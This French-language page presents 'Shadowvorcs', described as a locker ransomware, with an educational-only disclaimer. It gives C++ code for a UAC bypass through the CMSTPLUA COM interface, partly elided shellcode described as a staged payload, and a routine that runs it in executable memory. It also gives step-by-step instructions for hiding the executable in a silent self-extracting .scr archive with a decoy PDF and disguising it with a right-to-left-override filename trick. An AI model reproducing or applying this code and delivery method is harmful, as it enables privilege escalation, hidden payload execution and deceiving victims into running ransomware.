Présentation de Shadowvorcs

SV
SHADOWVORCS v1.0
Ransomware de type "locker" avec capacités de persistance et d'évasion de défenses
⚠️ PROJET ÉDUCATIF UNIQUEMENT — Ce code est fourni strictement à des fins pédagogiques et d'analyse technique. Doit être utilisé exclusivement dans un environnement lab sécurisé et isolé.

Application Windows native développée en C++ pur utilisant l'API Win32 de Microsoft. Zéro framework, zéro surcouche — uniquement du code système bas niveau. Conçu pour prendre le contrôle total d'un système Windows, désactiver ses protections et bloquer l'accès utilisateur.

BLOCS 02–04 — COM & Bypass UAC

02
Directives de Liaison COM
Liaison automatique des bibliothèques COM au compilateur
Code — Bloc 02
#pragma comment(lib, "ole32.lib") #pragma comment(lib, "oleaut32.lib")

Ces directives #pragma indiquent au compilateur de lier automatiquement les bibliothèques COM ole32.lib et oleaut32.lib nécessaires à l'interaction avec les objets COM Windows.

03
Définitions COM — CMSTPLUA
Interface virtuelle COM pour le contournement UAC
Code — Identifiants COM
const CLSID CLSID_CMSTPLUA = { 0x3E5FC7F9, 0x9A51, 0x4367, { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 } }; const IID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75, { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C } };
Code — Structure VTable ICMLuaUtil
typedef struct ICMLuaUtilVtbl { BEGIN_INTERFACE HRESULT (STDMETHODCALLTYPE *QueryInterface)(...); ULONG (STDMETHODCALLTYPE *AddRef)(...); ULONG (STDMETHODCALLTYPE *Release)(...); HRESULT (STDMETHODCALLTYPE *Method1 à Method6)(...); HRESULT (STDMETHODCALLTYPE *ShellExec)( ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, int ); END_INTERFACE } ICMLuaUtilVtbl;

Cette structure définit l'interface virtuelle pour l'objet COM CMSTPLUA. La méthode ShellExec est utilisée pour exécuter des commandes avec des privilèges élevés sans invite UAC.

04
Fonction de Bypass UAC
Contournement de l'UAC — exécution admin sans fenêtre de confirmation
Code — BypassUAC_CMSTPLUA()
bool BypassUAC_CMSTPLUA(const wchar_t* command, const wchar_t* parameters) { HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED); if (FAILED(hr)) return false; ICMLuaUtil* pLuaUtil = NULL; hr = CoCreateInstance(CLSID_CMSTPLUA, NULL, CLSCTX_LOCAL_SERVER, IID_ICMLuaUtil, (void**)&pLuaUtil); if (FAILED(hr) || !pLuaUtil) { CoUninitialize(); return false; } hr = pLuaUtil->lpVtbl->ShellExec(pLuaUtil, command, parameters, NULL, NULL, SW_SHOWNORMAL); pLuaUtil->lpVtbl->Release(pLuaUtil); CoUninitialize(); return SUCCEEDED(hr); }
CoInitializeEx()Initialise la bibliothèque COM en mode apartment-threaded
CoCreateInstance()Crée une instance de l'objet CMSTPLUA avec élévation locale
ShellExec()Exécute une commande avec privilèges admin sans invite UAC
Release()Libère les ressources COM allouées
CoUninitialize()Finalise la session COM

Code machine binaire injecté et exécuté directement en mémoire

unsigned char shellcode[] = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30" "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52" ... "\xff\xd5";

Ce shellcode contient du code machine binaire conçu pour être un staged payload — il peut télécharger des charges utiles supplémentaires, établir des connexions distantes ou exfiltrer des données.

06
Exécution du Shellcode
Allocation mémoire exécutable et lancement du payload en RAM
Code — executeShellcode()
void executeShellcode() { void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof(shellcode)); ((void(*)())exec)(); }
VirtualAlloc()Alloue une zone mémoire avec permissions d'exécution (RWX)
memcpy()Copie le shellcode dans la zone mémoire allouée
((void(*)())exec)()Cast en pointeur de fonction et exécute le code en mémoire

Obfuscation RLO & Emballage SFX

RLO
Technique d'Obfuscation RLO
Stéganographie du nom de fichier avec le caractère Right-to-Left Override (U+202E)
Étape 1 — Créer le fichier batch de lancement

Créer un fichier imortel.bat contenant :

Contenu de imortel.bat
start "" "imortel.pdf" start "" "imortel.exe"
Ligne 1Ouvre le PDF/PNG leurre pour tromper l'utilisateur
Ligne 2Lance silencieusement l'exécutable malveillant en arrière-plan
Étape 2 — Création de l'archive SFX auto-extractible

Sélectionner les 3 fichiers nécessaires :

imortel.pdfLeurre stéganographique (ou .png)
imortel.exeLe malware réel
imortel.batLe script de lancement
Configuration archive SFX (WinRAR)
Nom de l'archive : Imortel.scr ✅ Cocher : "Créer une archive SFX" Onglet "Avancé" → "Options SFX..." : → Exécuter après extraction : imortel.bat → Modes : "Masquer tout" (Silent mode) → Mise à jour : "Écraser tous les fichiers" → Texte et icône : sélectionner Imortel.ico

L'extension .scr est cruciale — elle s'exécute comme un .exe mais paraît moins suspecte.

Étape 3 — Obfuscation du nom avec le caractère RLO
1.Renommer le fichier Imortel.scr en Shadowvofdp.scr
2.Insérer le caractère RLO (U+202E) juste avant le "f" de "fdp"
3.Le nom s'affiche alors comme : Shadowvorcs.pdf
4.Obtenir le RLO depuis unicode-explorer.com/c/202E

Le caractère Right-to-Left Override inverse l'ordre d'affichage des caractères suivants. Ainsi Shadowvo[RLO]fdp.scr s'affiche comme Shadowvorcs.pdf — la vraie extension .scr est masquée.
